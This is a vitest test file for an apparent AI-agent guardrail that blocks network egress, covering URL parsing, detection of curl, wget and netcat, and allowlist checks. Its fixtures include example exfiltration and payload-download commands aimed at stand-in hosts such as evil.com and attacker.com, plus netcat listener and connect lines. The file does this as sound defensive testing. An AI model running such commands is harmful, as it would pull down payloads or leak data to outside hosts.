// Tests for the no-network-egress invariant
import { describe, it, expect, beforeEach } from 'vitest';
import {
  DEFAULT_INVARIANTS,
  extractDomainFromUrl,
  extractUrlFromCommand,
  isNetworkCommand,
} from '@red-codes/invariants';
import type { SystemState } from '@red-codes/invariants';
import { resetEventCounter } from '@red-codes/events';

beforeEach(() => {
  resetEventCounter();
});

function findInvariant(id: string) {
  const inv = DEFAULT_INVARIANTS.find((i) => i.id === id);
  if (!inv) throw new Error(`Invariant ${id} not found`);
  return inv;
}

describe('extractDomainFromUrl', () => {
  it('extracts domain from https URL', () => {
    expect(extractDomainFromUrl('https://api.github.com/repos')).toBe('api.github.com');
  });

  it('extracts domain from http URL', () => {
    expect(extractDomainFromUrl('http://example.com/path')).toBe('example.com');
  });

  it('extracts domain from URL with port', () => {
    expect(extractDomainFromUrl('https://localhost:3000/api')).toBe('localhost');
  });

  it('handles IP addresses', () => {
    expect(extractDomainFromUrl('http://192.168.1.1/data')).toBe('192.168.1.1');
  });

  it('returns null for empty string', () => {
    expect(extractDomainFromUrl('')).toBeNull();
  });

  it('returns null for invalid input', () => {
    expect(extractDomainFromUrl(null as unknown as string)).toBeNull();
  });

  it('handles bare domain with protocol', () => {
    expect(extractDomainFromUrl('https://evil.com')).toBe('evil.com');
  });
});

describe('extractUrlFromCommand', () => {
  it('extracts URL from curl command', () => {
    expect(extractUrlFromCommand('curl https://api.github.com/repos')).toBe(
      'https://api.github.com/repos'
    );
  });

  it('extracts URL from wget command', () => {
    expect(extractUrlFromCommand('wget http://evil.com/payload')).toBe('http://evil.com/payload');
  });

  it('extracts URL with flags', () => {
    expect(extractUrlFromCommand('curl -s -X POST https://example.com/api/data')).toBe(
      'https://example.com/api/data'
    );
  });

  it('returns null for command without URL', () => {
    expect(extractUrlFromCommand('curl localhost')).toBeNull();
  });

  it('returns null for empty command', () => {
    expect(extractUrlFromCommand('')).toBeNull();
  });
});

describe('isNetworkCommand', () => {
  it('detects curl', () => {
    expect(isNetworkCommand('curl https://example.com')).toBe(true);
  });

  it('detects wget', () => {
    expect(isNetworkCommand('wget http://evil.com/payload')).toBe(true);
  });

  it('detects nc (netcat)', () => {
    expect(isNetworkCommand('nc -l 8080')).toBe(true);
  });

  it('detects netcat', () => {
    expect(isNetworkCommand('netcat 192.168.1.1 4444')).toBe(true);
  });

  it('does not flag normal commands', () => {
    expect(isNetworkCommand('ls -la')).toBe(false);
    expect(isNetworkCommand('git push origin main')).toBe(false);
  });

  it('returns false for empty input', () => {
    expect(isNetworkCommand('')).toBe(false);
  });
});

describe('no-network-egress invariant', () => {
  const inv = findInvariant('no-network-egress');

  it('holds for non-network actions', () => {
    const state: SystemState = {
      currentActionType: 'file.write',
      currentTarget: 'src/index.ts',
    };
    const result = inv.check(state);
    expect(result.holds).toBe(true);
    expect(result.actual).toBe('Not a network request');
  });

  it('fails open when no allowlist is configured (undefined)', () => {
    const state: SystemState = {
      currentActionType: 'http.request',
      currentTarget: 'https://example.com/api',
    };
    const result = inv.check(state);
    expect(result.holds).toBe(true);
    expect(result.actual).toContain('fail-open');
  });

  it('denies http.request when allowlist is empty array', () => {
    const state: SystemState = {
      currentActionType: 'http.request',
      currentTarget: 'https://evil.com/exfiltrate',
      networkEgressAllowlist: [],
    };
    const result = inv.check(state);
    expect(result.holds).toBe(false);
    expect(result.actual).toContain('evil.com');
    expect(result.actual).toContain('no allowlist configured');
  });

  it('denies curl command to non-allowlisted domain', () => {
    const state: SystemState = {
      currentActionType: 'shell.exec',
      currentCommand: 'curl https://attacker.com/steal',
      networkEgressAllowlist: ['github.com'],
    };
    const result = inv.check(state);
    expect(result.holds).toBe(false);
    expect(result.actual).toContain('attacker.com');
  });

  it('denies wget command to non-allowlisted domain', () => {
    const state: SystemState = {
      currentActionType: 'shell.exec',
      currentCommand: 'wget http://malicious.org/payload',
      networkEgressAllowlist: ['npmjs.org'],
    };
    const result = inv.check(state);
    expect(result.holds).toBe(false);
    expect(result.actual).toContain('malicious.org');
  });

  it('allows http.request to allowlisted domain', () => {
    const state: SystemState = {
      currentActionType: 'http.request',
      currentTarget: 'https://api.github.com/repos',
      networkEgressAllowlist: ['github.com'],
    };
    const result = inv.check(state);
    expect(result.holds).toBe(true);
    expect(result.actual).toContain('api.github.com');
    expect(result.actual).toContain('allowed');
  });

  it('allows curl to allowlisted domain', () => {
    const state: SystemState = {
      currentActionType: 'shell.exec',
      currentCommand: 'curl https://registry.npmjs.org/express',
      networkEgressAllowlist: ['npmjs.org'],
    };
    const result = inv.check(state);
    expect(result.holds).toBe(true);
    expect(result.actual).toContain('registry.npmjs.org');
  });

  it('supports subdomain matching on allowlist', () => {
    const state: SystemState = {
      currentActionType: 'http.request',
      currentTarget: 'https://api.example.com/data',
      networkEgressAllowlist: ['example.com'],
    };
    const result = inv.check(state);
    expect(result.holds).toBe(true);
  });

  it('denies when domain does not match allowlist', () => {
    const state: SystemState = {
      currentActionType: 'http.request',
      currentTarget: 'https://evil.com/data',
      networkEgressAllowlist: ['github.com', 'npmjs.org'],
    };
    const result = inv.check(state);
    expect(result.holds).toBe(false);
    expect(result.actual).toContain('evil.com');
    expect(result.actual).toContain('not in allowlist');
  });

  it('denies when domain cannot be determined', () => {
    const state: SystemState = {
      currentActionType: 'http.request',
      currentTarget: '',
      networkEgressAllowlist: ['example.com'],
    };
    const result = inv.check(state);
    expect(result.holds).toBe(false);
    expect(result.actual).toContain('could not be determined');
  });

  it('uses requestDomain from state when provided', () => {
    const state: SystemState = {
      isNetworkRequest: true,
      requestDomain: 'trusted.internal',
      networkEgressAllowlist: ['trusted.internal'],
    };
    const result = inv.check(state);
    expect(result.holds).toBe(true);
  });

  it('uses requestUrl from state when requestDomain not provided', () => {
    const state: SystemState = {
      isNetworkRequest: true,
      requestUrl: 'https://allowed.io/api',
      networkEgressAllowlist: ['allowed.io'],
    };
    const result = inv.check(state);
    expect(result.holds).toBe(true);
  });

  it('handles localhost', () => {
    const state: SystemState = {
      currentActionType: 'http.request',
      currentTarget: 'http://localhost:3000/api',
      networkEgressAllowlist: ['localhost'],
    };
    const result = inv.check(state);
    expect(result.holds).toBe(true);
  });

  it('handles IP addresses', () => {
    const state: SystemState = {
      currentActionType: 'shell.exec',
      currentCommand: 'curl http://192.168.1.100/data',
      networkEgressAllowlist: ['192.168.1.100'],
    };
    const result = inv.check(state);
    expect(result.holds).toBe(true);
  });

  it('case-insensitive domain matching', () => {
    const state: SystemState = {
      currentActionType: 'http.request',
      currentTarget: 'https://API.GitHub.COM/repos',
      networkEgressAllowlist: ['github.com'],
    };
    const result = inv.check(state);
    expect(result.holds).toBe(true);
  });

  it('holds for git actions (not network)', () => {
    const state: SystemState = {
      currentActionType: 'git.push',
      currentCommand: 'git push origin main',
    };
    const result = inv.check(state);
    expect(result.holds).toBe(true);
  });

  it('denies with empty allowlist (default deny all)', () => {
    const state: SystemState = {
      currentActionType: 'http.request',
      currentTarget: 'https://example.com/api',
      networkEgressAllowlist: [],
    };
    const result = inv.check(state);
    expect(result.holds).toBe(false);
  });
});
